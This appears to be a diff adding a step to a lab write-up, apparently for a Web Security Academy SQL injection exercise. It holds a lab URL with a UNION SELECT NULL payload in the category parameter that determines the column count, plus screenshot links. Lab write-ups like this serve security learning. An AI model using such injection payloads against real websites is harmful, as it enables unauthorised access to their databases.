@@ -135,5 +135,10 @@ In this way any requests that I make in tthe browser will get intercepted throug
 
 ![image](https://user-images.githubusercontent.com/123303806/234784924-b0b0ae64-50ca-4794-adf2-58c4e636c4d5.png)
 
+https://0ac100c404344948849e7ce60068005c.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+NULL,+NULL,NULL--
+
+Add the above in the url as to solve the problem.
+
+![image](https://user-images.githubusercontent.com/123303806/234789307-fc4ce8e8-ec92-4006-b685-35d8cba16cde.png)
 
 
